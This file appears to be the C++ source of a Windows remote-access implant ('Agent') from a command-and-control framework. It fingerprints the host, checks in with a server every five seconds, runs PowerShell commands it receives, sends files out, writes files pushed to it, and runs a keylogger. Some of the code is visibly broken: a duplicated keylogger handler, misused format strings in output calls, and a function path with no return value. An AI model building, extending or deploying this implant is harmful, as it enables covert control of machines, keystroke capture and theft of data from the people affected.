#define WIN32_LEAN_AND_MEAN
#define WINVER 0x0600
#define _WIN32_WINNT 0x0600

#include "Agent.h"
#include "base64.hpp"

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <psapi.h>

#include <iostream>
#include <memory>
#include <array>
#include <cmath>
#include <cstdio>
#include <filesystem>
#include <fstream>
#include <variant>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

template <class... Ts>
struct overloaded : Ts...
{
    using Ts::operator()...;
};
template <class... Ts>
overloaded(Ts...) -> overloaded<Ts...>;

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Default constructor
Agent::Agent(CommManager commManager, TaskQueueManager taskManager)
{
    this->commManager = commManager;
    this->taskManager = taskManager;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//

void Agent::Start()
{
    // Perform the initial check-in and send host information to the communication manager.
    commManager.IntialCheckin(GetHostInformation().StructToJson());

    // Continuously check for new tasks and process pending tasks.
    while (true)
    {
        // Check in with the server, including any available task results,
        // and queue any new task returned by the server.
        std::string newTask = commManager.Checkin(taskManager.GetTaskResults());
        taskManager.QueueTask(newTask);

        if (!taskManager.HasPendingResult())
        {
            auto request = commManager.Checkin(taskManager.GetTaskResults());
            taskManager.QueueTask(request);
        }
        else
        {
            std::string newTask = commManager.Checkin(taskManager.GetTaskResults());

            taskManager.QueueTask(newTask);
        }

        // Only process a task if one is waiting in the task queue.
        if (taskManager.HasPendingTask())
        {
            // Retrieve the next task from the queue.
            auto request = taskManager.GetNextTask();

            // Dispatch the task based on its request type.
            // Each handler returns a Response containing the task result.
            Response result = std::visit(
                overloaded{
                    // Handle PowerShell command requests.
                    [this](const TaskRequest<CommandPowershell> &psRequest) -> Response
                    {
                        return this->ExecutePowerShell(
                            psRequest.taskID,
                            psRequest.data);
                    },

                    // Handle file upload requests.
                    [this](const TaskRequest<CommandUploadFile> &uploadRequest) -> Response
                    {
                        return this->UploadFile(
                            uploadRequest.taskID,
                            uploadRequest.data);
                    },

                    // Handle file download requests.
                    [this](const TaskRequest<CommandDownloadFile> &downloadRequest) -> Response
                    {
                        return this->DownloadFile(
                            downloadRequest.taskID,
                            downloadRequest.data);
                    },

                    // Handle keylogger start requests.
                    [this](const TaskRequest<Keylogger> &keyloggerRequest) -> Response
                    {
                        Keylogger keylogger;
                        return this->keylogger.keylog_start(keyloggerRequest.taskID);
                    },

                    // Handle keylogger stop requests.
                    [this](const TaskRequest<Keylogger> &keyloggerRequest) -> Response
                    {
                        Keylogger keylogger;
                        return this->keylogger.get_keylog_data(keyloggerRequest.taskID);
                    },

                    // Return an error response for explicitly unsupported Boolean tasks.
                    [](const TaskRequest<bool> &) -> Response
                    {
                        return CreateTaskResponse(
                            0,
                            NO_CODE,
                            NO_CODE,
                            TASK_ERROR,
                            TaskError{1, "Unsupported task."});
                    },

                    // Provide a default response for any other unhandled request type.
                    [](const auto &) -> Response
                    {
                        return TaskResponse<TaskSuccess>{};
                    }},
                request);

            // Store the response so it can be included in a subsequent check-in.
            taskManager.StoreTaskResult(result);
        }

        // Pause for five seconds before checking in again.
        Sleep(5000);
    }
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//

// Agent default commands
void Agent::Exit()
{
    ExitProcess(0);
}

Response Agent::GetUID(const int &taskID, const bool &isTrue)
{
    char username[256];
    DWORD username_len = sizeof(username);
    // Get the username of the current user
    GetUserNameA(username, &username_len);

    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{username});
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
Response Agent::ExecutePowerShell(const int &taskID, const CommandPowershell &psRequest)
{
    std::string result;
    std::string psCommand = "powershell.exe -Command \"" + psRequest.commandlet + "\"";
    FILE *pipe = _popen(psCommand.c_str(), "r");
    if (!pipe)
    {
        return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskError{0, "Failed to open process pipe."});
    }

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)

    {
        result += buffer;
    }

    _pclose(pipe);

    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{result});
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Helpers
std::string ConvertLPWSTRToStdString(LPWSTR lpwstr)
{
    if (!lpwstr)
        return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, NULL, 0, NULL, NULL);

    if (size <= 0)
        return "";
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, &result[0], size, NULL, NULL);

    return result;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string Agent::CaptureCommandOutput(const std::string &cmd)
{
    std::array<char, 128> buffer;
    std::string result;

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != NULL)
    {
        result += buffer.data();
    }

    if (!result.empty())
    {
        result.erase(result.find_last_not_of(" \n\r\t") + 1);
    }
    return result;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Host metadata commands
std::string Agent::GetMotherBoard()
{
    std::string cmd = "powershell -Command \"(Get-CimInstance Win32_BaseBoard).Product\"";
    std::string name = CaptureCommandOutput(cmd);
    return name;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
BOOL Agent::GetUsername(OUT LPWSTR *szWhoamiStr)
{
    DWORD dwSize = 0x00;
    BOOL bResult = FALSE;

    if (!GetUserNameW(NULL, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
    {
        std::cout << "[x] GetUserNameW [%d] Failed With Error: %d \n", __LINE__, GetLastError();
        goto _END_OF_FUNC;
    }

    if (!(*szWhoamiStr = (LPWSTR)LocalAlloc(LPTR, dwSize * sizeof(WCHAR))))
    {
        std::cout << "[x] LocalAlloc Failed With Error: %d \n", GetLastError();
        goto _END_OF_FUNC;
    }

    if (!GetUserNameW(*szWhoamiStr, &dwSize))
    {
        std::cout << "[x] GetUserNameW Failed With Error: %d \n", __LINE__, GetLastError();
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (!bResult && *szWhoamiStr)
    {
        LocalFree(*szWhoamiStr);
    }
    return bResult;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string Agent::GetInternalIP()
{
    ULONG outBufLen = 15000;
    std::vector<BYTE> buffer(outBufLen);
    PIP_ADAPTER_ADDRESSES pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());

    // Retrieve network adapter configurations
    DWORD dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);

    if (dwRetVal == ERROR_BUFFER_OVERFLOW)
    {
        buffer.resize(outBufLen);
        pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
        dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
    }

    if (dwRetVal == NO_ERROR)
    {
        while (pAddresses)
        {
            // Ignore loopback and inactive interfaces
            if (pAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK && pAddresses->OperStatus == IfOperStatusUp)
            {
                PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddresses->FirstUnicastAddress;
                while (pUnicast)
                {
                    if (pUnicast->Address.lpSockaddr->sa_family == AF_INET)
                    {
                        sockaddr_in *sa_in = reinterpret_cast<sockaddr_in *>(pUnicast->Address.lpSockaddr);

                        int b1 = sa_in->sin_addr.S_un.S_un_b.s_b1;
                        int b2 = sa_in->sin_addr.S_un.S_un_b.s_b2;
                        int b3 = sa_in->sin_addr.S_un.S_un_b.s_b3;
                        int b4 = sa_in->sin_addr.S_un.S_un_b.s_b4;

                        char ipBuffer[16];
                        sprintf_s(ipBuffer, "%d.%d.%d.%d", b1, b2, b3, b4);
                        return std::string(ipBuffer);
                    }
                    pUnicast = pUnicast->Next;
                }
            }
            pAddresses = pAddresses->Next;
        }
    }
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string Agent::GetExternalViaDNS()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return "";

    struct addrinfo hints, *result = NULL;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    DWORD dwRetval = getaddrinfo("www.google.com", NULL, &hints, &result);
    if (dwRetval == 0)
    {
        struct sockaddr_in *sockaddr_ipv4 = (struct sockaddr_in *)result->ai_addr;
        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);
        return ipStr;
        freeaddrinfo(result);
    }
    else
    {
        std::cerr << "DNS Query Failed." << std::endl;
    }
    WSACleanup();
    return "";
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string Agent::GetMachineMacAddress()
{
    ULONG bufferSize = 15000;
    std::vector<BYTE> buffer(bufferSize);

    ULONG flags = GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST;
    PIP_ADAPTER_ADDRESSES adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());

    ULONG result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);

    if (result == ERROR_BUFFER_OVERFLOW)
    {
        buffer.resize(bufferSize);
        adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
        result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);
    }

    if (result == NO_ERROR)
    {
        for (PIP_ADAPTER_ADDRESSES adapter = adapterList; adapter != NULL; adapter = adapter->Next)
        {
            if (adapter->OperStatus == IfOperStatusUp && adapter->PhysicalAddressLength == 6)
            {
                char macBuffer[18];
                snprintf(macBuffer, sizeof(macBuffer), "%02X:%02X:%02X:%02X:%02X:%02X",
                         adapter->PhysicalAddress[0], adapter->PhysicalAddress[1],
                         adapter->PhysicalAddress[2], adapter->PhysicalAddress[3],
                         adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);

                return std::string(macBuffer);
            }
        }
    }

    return "";
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string Agent::GetProcessName()
{
    HANDLE hProcess = GetCurrentProcess();
    char buffer[MAX_PATH];

    DWORD size = GetModuleBaseNameA(hProcess, NULL, buffer, MAX_PATH);
    return std::string(buffer, size);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int Agent::GetPID()
{
    HANDLE hProcess = GetCurrentProcess();
    return GetProcessId(hProcess);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int Agent::GetOSVersion()
{
    PBYTE pSharedUserData = (PBYTE)0X7FFE0000;
    return *(ULONG *)(pSharedUserData + 0x26C);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int Agent::GetRAM()
{
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);

    if (GlobalMemoryStatusEx(&memInfo))
    {
        double totalRamBytes = static_cast<double>(memInfo.ullTotalPhys);
        double totalRamGB = totalRamBytes / (1024.0 * 1024.0 * 1024.0);
        return static_cast<int>(std::round(totalRamGB));
    }

    return 0;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
void Agent::GetTotalDiskSize(OUT double *total, OUT double *free)
{
    ULARGE_INTEGER freeBytesAvailableToCaller;
    ULARGE_INTEGER totalNumberOfBytes;
    ULARGE_INTEGER totalNumberOfFreeBytes;

    std::string cDrive = "C:\\";

    if (GetDiskFreeSpaceEx(cDrive.c_str(), &freeBytesAvailableToCaller, &totalNumberOfBytes, &totalNumberOfFreeBytes))
    {
        *total = std::round(static_cast<double>(totalNumberOfBytes.QuadPart) / (1024.0 * 1024.0 * 1024.0));
        *free = std::round(static_cast<double>(totalNumberOfFreeBytes.QuadPart) / (1024.0 * 1024.0 * 1024.0));
    }
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int Agent::GetCpuCount()
{
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return static_cast<int>(sysInfo.dwNumberOfProcessors);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
IntitalCheckinRequest Agent::GetHostInformation()
{
    std::string internalIP;
    std::string externalIP;
    std::string OS;
    double free, total;
    LPWSTR username;
    std::string processName;
    int pid;

    GetUsername(&username);
    GetTotalDiskSize(&total, &free);

    return IntitalCheckinRequest{
        GetInternalIP(),
        GetExternalViaDNS(),
        "Windows " + std::to_string(GetOSVersion()),
        ConvertLPWSTRToStdString(username),
        GetProcessName(),
        GetPID(),
        "High", // TODO Integrity
        GetMachineMacAddress(),
        GetMotherBoard(),
        GetRAM(),
        total,
        free,
        GetCpuCount()};
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// File Transfer Commands
Response Agent::UploadFile(const int &taskID, const CommandUploadFile &uploadRequest)
{
    const bool sent = commManager.SendFile(uploadRequest.path);
    if (sent)
        return CreateTaskResponse(taskID, UPLOAD, NO_CODE, SUCCESS,
                                  TaskSuccess{"File uploaded successfully."});
    return CreateTaskResponse(taskID, UPLOAD, NO_CODE, TASK_ERROR,
                              TaskError{1, "File upload failed."});
}

Response Agent::DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest)
{
    const auto directory = std::filesystem::path("files");
    std::filesystem::create_directories(directory);
    const auto path = directory / std::filesystem::path(downloadRequest.path).filename();
    const auto bytes = base64::from_base64(downloadRequest.data);
    std::ofstream output(path, downloadRequest.offset == 0
                                   ? std::ios::binary
                                   : std::ios::binary | std::ios::app);
    output.write(bytes.data(), static_cast<std::streamsize>(bytes.size()));
    if (output)
        return CreateTaskResponse(taskID, DOWNLOAD_2, DOWNLOAD, SUCCESS,
                                  TaskSuccess{"File chunk stored."});
    return CreateTaskResponse(taskID, DOWNLOAD_2, DOWNLOAD, TASK_ERROR,
                              TaskError{1, "File chunk could not be stored."});
}